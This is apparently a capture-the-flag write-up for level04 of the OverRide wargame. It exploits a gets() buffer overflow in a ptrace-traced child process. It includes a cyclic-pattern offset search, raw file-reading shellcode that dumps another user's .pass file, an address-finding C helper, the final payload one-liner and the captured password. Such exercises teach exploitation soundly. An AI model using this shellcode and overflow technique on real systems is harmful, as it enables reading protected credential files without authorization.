level04@OverRide:~$ ./level04 
Give me some shellcode, k
aaaaaaaaaaaaaaa
child is exiting...

We can see in the code that it create a child process, trace it with ptrace to prevent any execve inside it by killing the process before the execution of the execve command.

RTFM --> All successful calls to execve(2) by the traced process will cause it to be sent a SIGTRAP signal, giving the parent a chance to gain control before the new program begins execution.

Also we can see that we have an unprotected gets in the child process, let's check eip offset.


We use : > (gdb) set follow-fork-mode child # to follow the child process instead of the parent

(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level04/level04 
[New process 1718]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1718]
0x41326641 in ?? ()

We have an offset of 156 !


It's easy, we just have to put our shellcode in a env var, and send a padding of 156 + the address of our buffer and it should work ! 
Buuuuuuut, the child is watched by ptrace so an exec in our shellcode will not worked and be stopped by the parent, we need to use an other thing
We will use a shellcode that open, read, and then write our .pass file on the stdout !

> export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'

# We need to find the adress of our shellcode :

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    printf("%p\n", getenv("SHELLCODE"));
}

level04@OverRide:/tmp$ gcc -m32 getenv.c 
level04@OverRide:/tmp$ ./a.out 
0xffffd7af --> Our address

level04@OverRide:~$ python -c 'print("a" * 156 + "\xaf\xd7\xff\xff")' | ./level04 
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...

EZ
